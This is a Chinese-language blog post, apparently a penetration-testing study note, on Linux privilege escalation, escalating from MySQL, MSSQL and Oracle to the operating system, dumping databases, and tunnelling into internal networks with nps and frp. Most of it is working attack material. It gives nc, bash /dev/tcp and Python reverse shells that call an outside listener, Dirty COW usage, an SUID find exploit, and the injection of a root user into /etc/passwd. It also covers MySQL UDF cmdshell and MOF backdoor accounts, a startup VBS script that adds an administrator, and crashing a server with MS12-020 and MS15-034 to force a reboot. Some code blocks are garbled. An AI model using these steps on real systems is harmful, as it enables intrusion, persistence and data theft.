<h2 id="Linux提权方法总结"><a href="#Linux提权方法总结" class="headerlink" title="Linux提权方法总结"></a>Linux提权方法总结</h2><p>Linux提权的前提：</p>
<ol>
<li>拿到了一个低权限的账号</li>
<li>能上传和下载文件</li>
<li>机器上有python、java、perl等环境（非必须项）</li>
</ol>
<h3 id="一、Linux反弹提权"><a href="#一、Linux反弹提权" class="headerlink" title="一、Linux反弹提权"></a>一、Linux反弹提权</h3><p>**如果手里只有webshell可以利用反弹shell来得到一个shell，反弹的权限是中间件的权限。 **</p>
<h4 id="1、NC反弹shell"><a href="#1、NC反弹shell" class="headerlink" title="1、NC反弹shell"></a>1、NC反弹shell</h4><p><strong>NC详情参考：</strong><a target="_blank" rel="noopener" href="https://www.cnblogs.com/nmap/p/6148306.html">https://www.cnblogs.com/nmap/p/6148306.html</a></p>
<p><strong>①nc参数介绍</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">-l		指定nc将处于侦听模式，nc被当作server，侦听并接受连接。</span><br><span class="line">-p		&lt;port&gt;指定端口，老版本才需要-p</span><br><span class="line">-s		指定发送数据的源IP地址，适用于多网卡机</span><br><span class="line">-u		指定nc使用UDP协议，默认为TCP</span><br><span class="line">-v		输出交互或出错信息，新手调试时尤为有用</span><br><span class="line">-w		超时秒数，后面跟数字</span><br><span class="line">-z		表示zero，表示扫描时不发送任何数据</span><br></pre></td></tr></table></figure>

<p><strong>②nc做tcp监听</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 开启本地8080端口监听</span><br><span class="line">nc nc -l -p 80802</span><br></pre></td></tr></table></figure>

<p><strong>③nc反弹服务器shell</strong></p>
<p><strong>方法⑴：</strong>公网主机绑定SHELL</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#在公网监听端口5555端口,并绑定shell</span><br><span class="line">nc -lp 5555 -t -e cmd.exe</span><br><span class="line">#在内网主动建立到外网IP:5555的连接</span><br><span class="line">nc -nvv x.x.x.x 5555</span><br></pre></td></tr></table></figure>

<p><strong>方法⑵：</strong>内网主机绑定SHELL</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#在公网监听端口</span><br><span class="line">nc -lp 5555</span><br><span class="line">#在内网机器绑定shell反弹</span><br><span class="line">nc -t -e cmd x.x.x.x 5555</span><br></pre></td></tr></table></figure>

<h4 id="2、利用bash直接反弹"><a href="#2、利用bash直接反弹" class="headerlink" title="2、利用bash直接反弹"></a>2、利用bash直接反弹</h4><p><strong>（1） bash反弹一句话</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#先公网监听</span><br><span class="line">nc -l -p 8080</span><br><span class="line">#在内网bash反弹</span><br><span class="line">bash -i &gt;&amp; /dev/tcp/x.x.x.x/8080 0&gt;&amp;1</span><br></pre></td></tr></table></figure>

<p>网上还有很多方法一句话反弹shell，需要自行搜索</p>
<h3 id="二、内核漏洞提权——脏牛"><a href="#二、内核漏洞提权——脏牛" class="headerlink" title="二、内核漏洞提权——脏牛"></a>二、内核漏洞提权——脏牛</h3><ol>
<li><strong>脏牛漏洞：</strong><br>又叫Dirty COW，存在Linux内核中已经有长达9年的时间，在2007年发布的Linux内核版本中就已经存在此漏洞。Linux kernel团队在2016年10月18日已经对此进行了修复。</li>
<li><strong>漏洞范围：</strong><br>Linux内核 &gt;&#x3D; 2.6.22（2007年发行，到2016年10月18日才修复）</li>
<li><strong>简要分析：</strong><br>该漏洞具体为，Linux内核的内存子系统在处理写入复制（copy-on-write, COW）时产生了竞争条件（race condition）。<br>竞争条件，指的是任务执行顺序异常，可导致应用崩溃，或令攻击者有机可乘，进一步执行其他代码。<br>恶意用户可利用此漏洞，来获取高权限，对只读内存映射进行写访问。</li>
<li><strong>exp：</strong><br><a target="_blank" rel="noopener" href="https://github.com/gbonacini/CVE-2016-5195">https://github.com/gbonacini/CVE-2016-5195</a></li>
</ol>
<h4 id="示例：脏牛内核提权"><a href="#示例：脏牛内核提权" class="headerlink" title="示例：脏牛内核提权"></a>示例：脏牛内核提权</h4><ol>
<li>首先确定发行版、内核版</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/issue</span><br><span class="line">cat /etc/*-release</span><br><span class="line">uname -a</span><br></pre></td></tr></table></figure>

<ol>
<li>根据内核版本，找exp，下载对应dirty.c文件编译</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -pthread dirty.c -o dirty -lcrypt</span><br></pre></td></tr></table></figure>

<ol>
<li>执行当前编译的dirty.c文件，然后输入新密码123456</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">./dirty</span><br><span class="line">#执行后，会将原来的passwd文件备份到/tmp目录</span><br><span class="line">#然后创建的新账号是firefart,密码123456</span><br></pre></td></tr></table></figure>

<ol>
<li>等创建成功后，切换到firefart用户<br>会发现此用户会发现已经是root权限了。<br>最好立刻再新建一个管理员账号，然后立刻恢复passwd文件。<br>因为这个提权不是新建了一个账号，而已用新账号替换了root账号，所以要把root账号恢复回去</li>
</ol>
<h3 id="三、SUID提权"><a href="#三、SUID提权" class="headerlink" title="三、SUID提权"></a>三、SUID提权</h3><p>SUID（设置用户ID）是赋予文件的一种特殊权限，拥有改权限的程序，任何用户执行的时候都是改命令都是以root权限执行的</p>
<p>suid提权是指这类有S权限的程序，如果能执行命令，那么我们就能从用改程序从普通用户提升到了root权限</p>
<h4 id="SUID可用命令"><a href="#SUID可用命令" class="headerlink" title="SUID可用命令"></a>SUID可用命令</h4><p><strong>⑴在本地查找符合条件的文件，有以下三个命令</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#尝试查找具有root权限的SUID的文件，不同系统适用于不同的命令，一个一个试</span><br><span class="line">find / -user root -perm -4000 -print 2&gt;/dev/null</span><br><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br><span class="line">find / -user root -perm -4000 -exec ls -ldb &#123;&#125; \;</span><br></pre></td></tr></table></figure>

<p><strong>⑵已知的可用来提权的linux可行性的文件列表如下：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">nmap</span><br><span class="line">vim</span><br><span class="line">find</span><br><span class="line">bash</span><br><span class="line">more</span><br><span class="line">less</span><br><span class="line">nano</span><br><span class="line">cp</span><br></pre></td></tr></table></figure>

<h4 id="示例：利用find文件提权"><a href="#示例：利用find文件提权" class="headerlink" title="示例：利用find文件提权"></a>示例：利用find文件提权</h4><p>假如我们现在拿到了一个网站服务器的shell，但是权限是ubuntu，我们现在需要提权到 root 用户权限。</p>
<ol>
<li><p>查看具有root用户权限的SUID文件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
</li>
<li><p>发现有find命令，再确认一下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ls -lh /usr/bin/find</span><br><span class="line">#权限是rwsr-xr-x 确实有s权限</span><br></pre></td></tr></table></figure>
</li>
<li><p>测试是否能用find命令以root权限运行</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/usr/bin/find examples.desktop -exec whoami \;</span><br><span class="line">#发现确实可以以root权限运行</span><br></pre></td></tr></table></figure>
</li>
<li><p>然后查看目标网站上是否的python环境<br>linux服务器一般都自带python，区别是有些2.X,有些3.x</p>
</li>
<li><p>于是我们以root用户的身份利用python反弹shell，</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#反弹一个sh类型的shell</span><br><span class="line">python -c &#x27;import socket,subprocess,os; \</span><br><span class="line">  s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); \</span><br><span class="line">  s.connect((&quot;192.168.10.25&quot;,4444)); \</span><br><span class="line">  os.dup2(s.fileno(),0); \</span><br><span class="line">  os.dup2(s.fileno(),1); \</span><br><span class="line">  os.dup2(s.fileno(),2); \</span><br><span class="line">  p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;</span><br></pre></td></tr></table></figure>
</li>
<li><p>远端nc监听<code>nc -lvp 4444</code><br>可以看到，在攻击端收到了反弹过来的shell，并且是root身份</p>
</li>
</ol>
<blockquote>
<p>本节来自：<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_36119192/article/details/84872644">https://blog.csdn.net/qq_36119192/article/details/84872644</a></p>
</blockquote>
<h3 id="四、Linux配置错误提权"><a href="#四、Linux配置错误提权" class="headerlink" title="四、Linux配置错误提权"></a>四、Linux配置错误提权</h3><p><strong>利用Linux的配置文件错误，导致 &#x2F;etc&#x2F;passwd 文件可写入提权</strong></p>
<p><strong>对Linux配置进行检查的脚本有：</strong><br><a target="_blank" rel="noopener" href="https://www.securitysift.com/download/linuxprivchecker.py">https://www.securitysift.com/download/linuxprivchecker.py</a><br><a target="_blank" rel="noopener" href="http://pentestmonkey.net/tools/audit/unix-privesc-check">http://pentestmonkey.net/tools/audit/unix-privesc-check</a></p>
<p><strong>当我们获得了某个Linux服务器的低权限之后，我们想要对该低权限账号进行提权，以执行更多的操作。</strong><br>接下来我们的提权是利用 &#x2F;etc&#x2F;passwd 文件的可写入权限，导致我们写入一个其他用户进去。</p>
<ol>
<li><p>查看 &#x2F;etc&#x2F;passwd 的权限，发现任何用户都可以读写。<br>我们现在要做的就是自己构造一个用户，在密码占位符处指定密码，并且UID设置为0，将其添加到 &#x2F;etc&#x2F;passwd 文件中。</p>
</li>
<li><p><strong>首先，使用perl语言生成带有盐值的密码：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">perl -le &#x27;print crypt(&quot;password@123&quot;,&quot;addedsalt&quot;)&#x27;</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>然后将test用户的信息加入 &#x2F;etc&#x2F;passwd 文件</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;test:advwtv/9yU5yQ:0:0:User_like_root:/root:/bin/bash&quot; &gt;&gt;/etc/passwd</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>以<code>test/password@123</code>登录主机</strong><br>登录成功后，是 root 权限。</p>
</li>
</ol>
<h3 id="五、定时任务提权"><a href="#五、定时任务提权" class="headerlink" title="五、定时任务提权"></a>五、定时任务提权</h3><p>系统内可能会有一些定时执行的任务，一般这些任务由crontab来管理，具有所属用户的权限。<br>非root权限的用户是不可以列出root 用户的计划任务的。但是系统的计划任务<code>/etc、cron*</code>可以被列出。<br>默认这些程序以root权限执行，如果有幸遇到一个把其中脚本配置成任意用户可写，我们就可以修改脚本进行提权了。</p>
<ol>
<li><p>列出系统定时任务</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls -l /etc/cron*</span><br></pre></td></tr></table></figure>
</li>
<li><p>查看列出的目录中，是否允许普通用户修改<br>&#x2F;etc&#x2F;cron.daily 、&#x2F;etc&#x2F;cron.hourly、&#x2F;etc&#x2F;cron.monthly、&#x2F;etc&#x2F;cron.weekly 这四个文件夹内的文件，查看是否允许其他用户修改。<br>如果允许任意用户修改，那么我们就可以往这些文件里面写入反弹shell的脚本提权了。</p>
</li>
</ol>
<h3 id="六、密码复用提权"><a href="#六、密码复用提权" class="headerlink" title="六、密码复用提权"></a>六、密码复用提权</h3><p>我们如果在主机上找到了其他应用或数据库的密码，那么很有可能root用户也用该密码，或者该参考该密码命名规则。那么就可以尝试一下 su root 来提权了。</p>
<h1 id="数据库提权到操作系统"><a href="#数据库提权到操作系统" class="headerlink" title="数据库提权到操作系统"></a>数据库提权到操作系统</h1><p>攻击者如果获取了通过数据库root权限，是可以通过提权，获取操作系统最高权限的。</p>
<h2 id="Mysql数据库提权"><a href="#Mysql数据库提权" class="headerlink" title="Mysql数据库提权"></a>Mysql数据库提权</h2><h3 id="如何获取mysql账号密码"><a href="#如何获取mysql账号密码" class="headerlink" title="如何获取mysql账号密码"></a>如何获取mysql账号密码</h3><p>当通过webshell进入服务器后，怎么得到数据库的账号密码呢</p>
<ol>
<li><p>查看网站配置文件。</p>
<p>如:conn、config、data、sql、common 、inc等。</p>
</li>
<li><p>查看数据库物理路径下的user表文件<br>目录为&#x2F;data&#x2F;mysql&#x2F;user.myd和user.myi<br>密码是加密的，需要再次进行破解</p>
</li>
<li><p>通过暴力破解得到（hscan、Bruter、hydra、脚本木马）<br>如果对外开放3306，即允许远程连接，可以远程爆破<br>补充：mysql开启root账号远程访问</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; GRANT ALL PRIVILEGES ON*.*TO root@&quot;\%&quot;IDENTIFIED BY&quot;root&quot;;</span><br><span class="line">mysql&gt; flush privileges;</span><br></pre></td></tr></table></figure></li>
</ol>
<h3 id="利用UDF自身提权"><a href="#利用UDF自身提权" class="headerlink" title="利用UDF自身提权"></a>利用UDF自身提权</h3><hr>
<ol>
<li>原理<br>UDF提权是利用MYSQL的Create Function语句，将MYSQL账号转化为系统system权限。</li>
<li>利用条件<ul>
<li>目标系统是Windows(Win2000,XP,Win2003)</li>
<li>已经拥有MYSQL的某个用户账号，此账号必须有对mysql的insert和delete权限以创建和抛弃函数</li>
<li>有root账号和密码</li>
</ul>
</li>
</ol>
<p><strong>利用方式A</strong></p>
<ol>
<li><p>使用工具“mysql综合利用工具”连接<br>填写地址、root账号、密码后进行连接</p>
<p><img src="http://noah-pic.oss-cn-chengdu.aliyuncs.com/pic/20210806/164305231.png" alt="mark"></p>
</li>
<li><p>导入udf.dll文件<br>连接成功后，导出DLL文件，导入时请勿必注意导出路径（一般情况下对任何目录可写，无需考虑权限问题），否则在下一步操作中你会看到”No paths allowed for shared library”错误。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#不同版本mysql，udf.dll存放路径不同</span><br><span class="line">#Mysql版本大于5.1版本。</span><br><span class="line">xx\\mysql\\lib\\plugin\\udf.dll 文件夹下。</span><br><span class="line">#Mysql5.1版本默认路径。</span><br><span class="line">C:\\Program Files\\MySQL\\MySQL Server 5.1\\lib\\plugin\\udf.dll</span><br><span class="line">#Mysql版本小于5.1版本。</span><br><span class="line">Windows2003下放置于c:\\windows\\system32\\udf.dll</span><br><span class="line">windows2000下放置于c:\\winnt\\system32\\udf.dll</span><br></pre></td></tr></table></figure></li>
</ol>
<p><strong>一般Lib、Plugin文件夹需要在webshell先手工建立（也可用NTFS ADS流模式突破进而创建文件夹）</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">```sql</span><br><span class="line">#查找到mysql的目录后</span><br></pre></td></tr></table></figure>

<p>select @@basedir;</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#利用NTFS ADS创建lib目录</span><br></pre></td></tr></table></figure>

<p>select ‘It is dll’ into dumpfile ‘C:\ProgramFiles\MySQL\MySQL Server 5.1\lib::$INDEX_ALLOCATION’;</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#利用NTFS ADS创建plugin目录</span><br><span class="line">select &#x27;It is dll&#x27; into dumpfile &#x27;C:\\ProgramFiles\\MySQL\\MySQL Server 5.1\\lib\\plugin::$INDEX_ALLOCATION&#x27;; </span><br><span class="line">```</span><br></pre></td></tr></table></figure>

<ol>
<li><p>UDF提权常用命令:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#创建cmdshell函数，如果用3389就需要创建open3389函数，具体有哪些函数看帮助</span><br><span class="line">create function cmdshell returns string soname &#x27;udf.dll&#x27;; </span><br><span class="line">#创建好函数后，用函数执行系统命令</span><br><span class="line">select cmdshell(&#x27;net user&#x27;);</span><br><span class="line">select open3389();</span><br><span class="line">drop function cmdshell; 删除函数</span><br><span class="line">delete from mysql.func where name=&#x27;cmdshell&#x27;  删除函数</span><br></pre></td></tr></table></figure>

<p>使用完成后你可能需要删除在第二步中导出的DLL，但在删除DLL前请先删除你在第三步中创建的函数，否则删除操作将失败，删除第三步中创建的函数的SQL语句为：drop function 创建的函数名；</p>
</li>
</ol>
<p><strong>利用方式B</strong></p>
<p>UDF脚本提权,当mysql不能远程连接时，可以上传udf脚本至对方主机，然后通过webshell的方式进行连接操作。</p>
<h3 id="利用mof提权"><a href="#利用mof提权" class="headerlink" title="利用mof提权"></a>利用mof提权</h3><p><strong>MOF漏洞工具与脚本实战：</strong><a target="_blank" rel="noopener" href="http://www.myhack58.com/Article/html/3/8/2013/38264.htm">http://www.myhack58.com/Article/html/3/8/2013/38264.htm</a></p>
<ol>
<li>原理<br>在windows平台下，c:&#x2F;windows&#x2F;system32&#x2F;wbem&#x2F;mof&#x2F;nullevt.mof这个文件会每间隔一段时间（很短暂）就会以system权限执行一次，所以，只要将要做的事通过代码存储到这个mof文件中，就可以实现权限提升。</li>
<li>利用条件<ul>
<li>mysql用户具有root权限</li>
<li>且可以复制文件到c:&#x2F;windows&#x2F;system32&#x2F;wbem&#x2F;mof&#x2F;目录下</li>
<li>关闭了secure-file-priv</li>
</ul>
</li>
</ol>
<p><strong>利用方式1</strong><br>通过工具如“mysql综合利用工具”直接提取，输入账户密码连接数据库后可直接输入系统命令，创建账号。</p>
<p><strong>利用方式2</strong></p>
<p>通过上传mof文件，然后在sql中运行的方式</p>
<ol>
<li><p>找个可写目录，上传mof文件</p>
<p>假设上传的目录为文件夹<code>C:\\wmpub\\moon.mof</code><br>该mof文件，已经写死了要创建的账号密码等信息</p>
</li>
<li><p>执行sql，转移文件到系统目录，等待创建新账号</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select load_file(&#x27;C:\\wmpub\\moon.mof&#x27;) into dumpfile &#x27;c:/windows/system32/wbem/mof/moon.mof&#x27;;</span><br></pre></td></tr></table></figure>
</li>
<li><p>执行完后，验证账号<br>在webshell里执行使用net user查看是否多了一个admin用户，如果有则说明可以利用，否则就不需要继续了，注意新建的帐号每隔5分钟就会新建帐号，删除帐号的办法参考上文链接</p>
</li>
</ol>
<h3 id="通过Mysql把文件写入启动项"><a href="#通过Mysql把文件写入启动项" class="headerlink" title="通过Mysql把文件写入启动项"></a>通过Mysql把文件写入启动项</h3><ol>
<li><p>通过mysql数据库命令写入VBS脚本；</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt;drop database test1;</span><br><span class="line">mysql&gt; create database test1;</span><br><span class="line">mysql&gt; use test1;</span><br><span class="line">mysql&gt; create table a (cmd text);</span><br><span class="line">mysql&gt;insert into a values (&quot;set wshshell=createobject (&quot;&quot;wscript.shell&quot;&quot;)&quot;);</span><br><span class="line">mysql&gt;insert into a values (&quot;a=wshshell.run (&quot;&quot;cmd.exe /c net user best best /add&quot;&quot;,0)&quot;);</span><br><span class="line">mysql&gt;insert into a values (&quot;b=wshshell.run (&quot;&quot;cmd.exe /c net localgroup Administrators best /add&quot;&quot;,0)&quot;);</span><br><span class="line">#注意双引号和括号以及后面的“0”一定要输入！我们将用这三条命令来建立一个VBS的脚本程序</span><br></pre></td></tr></table></figure></li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">2. 直接通过Webshell的Mysql写入启动项；</span><br><span class="line">    ```sql</span><br><span class="line">    mysql&gt;select * from a;</span><br><span class="line">    mysql&gt;select * from a into outfile &quot;c://docume~1//administrator//「开始」菜单//程序//启动//best.vbs&quot;;</span><br></pre></td></tr></table></figure>

<ol>
<li>通过MS12-020、MS15-034重启服务器。<br>服务器down机后，管理员会重启，重启后我们就能得到新建的管理员账号了</li>
</ol>
<h2 id="微软Mssql提权"><a href="#微软Mssql提权" class="headerlink" title="微软Mssql提权"></a>微软Mssql提权</h2><p>mssql提权主要分为弱口令与溢出两类提权。目前主要通过弱口令连接直接提权，溢出类Mssql数据库几乎很少见（sqlserver2000之后就几乎没有了）。</p>
<p>通过漏洞拉到webshell之后，找到网站配置文件，里面有<strong>sa权限</strong>的账号密码，配置文件为asp或者aspx网站一般使用微软自带数据库，这个提权没有sa权限是不能做的，mssql一般是允许远程连接的，系统库是master。<br>有了sa密码直接利用sqltools工具就可以了</p>
<h2 id="如何通过Oracle提权"><a href="#如何通过Oracle提权" class="headerlink" title="如何通过Oracle提权"></a>如何通过Oracle提权</h2><p>Oracle数据库一般与jsp、aspx网站搭配，如果是jsp网站，默认是系统权限，aspx网站默认需要提权。</p>
<p><strong>提权方法参考：</strong><a target="_blank" rel="noopener" href="http://blog.csdn.net/sezvboyrul/article/details/2855401,%E5%B7%A5%E5%85%B7%E4%B8%BA%60oracleshell%60">http://blog.csdn.net/sezvboyrul/article/details/2855401,工具为`oracleshell`</a></p>
<h2 id="数据库安全防范"><a href="#数据库安全防范" class="headerlink" title="数据库安全防范"></a>数据库安全防范</h2><ol>
<li>限止数据库远程连接，给数据库帐户设置密码必须&gt;8位以上并数字+字母+特殊符号等。</li>
<li>不要给网站配置root或SA权限。必须给每个网站独立分配数据库帐户并限格控制好权限。</li>
<li>及时升级数据库补丁。</li>
<li>安装Waf进行防御。</li>
<li>购买数据库审计设备</li>
</ol>
<h1 id="数据库脱库"><a href="#数据库脱库" class="headerlink" title="数据库脱库"></a>数据库脱库</h1><h2 id="工具脱库"><a href="#工具脱库" class="headerlink" title="工具脱库"></a>工具脱库</h2><p>通过百度查找Navicat Mysql、Navicat for SQL Server、Navicat for Oracle、Navicat for PostgreSQL、Navicat for SQLite等，也可以使用其它工具代替，如sqlmap、k8等类似工具。<br><strong>优点：</strong> 支持面广，功能强大，速度度、稳定<br><strong>缺点：</strong> 不能支持外链</p>
<h2 id="脚本脱库"><a href="#脚本脱库" class="headerlink" title="脚本脱库"></a>脚本脱库</h2><p>通过百度查找ASP、PHP、JSP脱库脚本等类似工具。<br><strong>优点：</strong> 解决不外链的情况<br><strong>缺点：</strong> 速度慢、不够稳定</p>
<h2 id="站点打包"><a href="#站点打包" class="headerlink" title="站点打包"></a>站点打包</h2><p>通过百度查找ASP、PHP、JSP脚本打包程序等类似工具。<br>asp+access源码和数据库是可以一起打包，其它类型数据库，库与源码是单独分开的。</p>
<h1 id="内网穿透"><a href="#内网穿透" class="headerlink" title="内网穿透"></a>内网穿透</h1><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_53568983/article/details/143032581">【蓝队技能】【内网隧道工具流量分析】FRP&amp;NPS&amp;reGeorg&amp;Venom_frp流量分析-CSDN博客</a></p>
<h2 id="nps逆向穿透"><a href="#nps逆向穿透" class="headerlink" title="nps逆向穿透"></a>nps逆向穿透</h2><p>项目地址：<a target="_blank" rel="noopener" href="https://github.com/ehang-io/nps/releases">https://github.com/ehang-io/nps/releases</a></p>
<p>实验架构图</p>
<img src="/img/oldboy/image-20250302205921712-1740920363278-1.png" alt="image-20250302205921712" style="zoom:50\%;" />



<p>1、nps配置（双网卡主机）</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">安装相关依赖（需要管理员权限）</span></span><br><span class="line">C:\neiwang\windows_amd64_server\nps.exe install</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">启动nps服务（需要管理员权限）</span></span><br><span class="line">C:\neiwang\windows_amd64_server\nps.exe start</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">http://192.168.138.132:8080/login/index</span><br><span class="line">账号 admin  密码 123</span><br></pre></td></tr></table></figure>





<p><img src="/img/oldboy/image-20250302210807232.png" alt="image-20250302210807232"></p>
<h3 id="端口映射"><a href="#端口映射" class="headerlink" title="端口映射"></a>端口映射</h3><p>创建隧道实现内网PC机的端口映射</p>
<p><img src="/img/oldboy/image-20250302212344121.png" alt="image-20250302212344121"></p>
<p><img src="/img/oldboy/image-20250302213050580-1740922252555-3.png" alt="image-20250302213050580"></p>
<p>2、npc配置</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">客户端开启服务</span></span><br><span class="line">./npc.exe -server=192.168.138.132:8024 -vkey=123456 -type=tcp</span><br></pre></td></tr></table></figure>





<img src="/img/oldboy/image-20250302213155368.png" alt="image-20250302213155368" style="zoom:50\%;" />



<p><img src="/img/oldboy/image-20250302213443822.png" alt="image-20250302213443822"></p>
<p>使用外网服务器远程连接192.168.138.132:8022端口</p>
<img src="/img/oldboy/image-20250302213323169.png" alt="image-20250302213323169" style="zoom:50\%;" />





<h3 id="流量转发"><a href="#流量转发" class="headerlink" title="流量转发"></a>流量转发</h3><p>nps创建socks代理</p>
<img src="/img/oldboy/image-20250302213652535-1740922614079-5.png" alt="image-20250302213652535" style="zoom:50\%;" />



<p>使用Proxifier代理</p>
<p>创建代理服务器</p>
<img src="/img/oldboy/image-20250302214052182.png" alt="image-20250302214052182" style="zoom:50\%;" />



<p>创建代理服务器</p>
<p>启动代理规则</p>
<img src="/img/oldboy/image-20250302214709180.png" alt="image-20250302214709180" style="zoom:50\%;" />







<p>配置当访问192.168.50.0-192.168.50.255使用代理服务器</p>
<p><img src="/img/oldboy/image-20250302220122380.png" alt="image-20250302220122380" style="zoom:50\%;" />使用本机测试是否能ping通</p>
<img src="/img/oldboy/image-20250302220025607.png" alt="image-20250302220025607" style="zoom: 50\%;" />



<p>但是无法ping通C主机。</p>
<img src="/img/oldboy/image-20250302220342320.png" alt="image-20250302220342320" style="zoom:25\%;" />

<p>验证成功！</p>
<h2 id="frp反向代理穿透"><a href="#frp反向代理穿透" class="headerlink" title="frp反向代理穿透"></a>frp反向代理穿透</h2><p>GitHub：<a target="_blank" rel="noopener" href="https://github.com/fatedier/frp/releases">https://github.com/fatedier/frp/releases</a></p>
<img src="/img/oldboy/image-20250302205921712-1740920363278-1.png" alt="image-20250302205921712" style="zoom:50\%;" />



<p><strong>1、服务端配置</strong></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line">bind_port = 7000</span><br><span class="line">token = 123456</span><br><span class="line">dashboard_port = 7500</span><br><span class="line">dashboard_user = admin</span><br><span class="line">dashboard_pwd = admin</span><br><span class="line">enable_prometheus = true</span><br></pre></td></tr></table></figure>



<p>启动frpc(不同操作系统，配置文件不同)</p>
<p>frps.exe -c frps.toml</p>
<p>访问<a target="_blank" rel="noopener" href="http://192.168.138.132:7500/">http://192.168.138.132:7500/</a></p>
<p><img src="/img/oldboy/image-20250302222451071.png" alt="image-20250302222451071"></p>
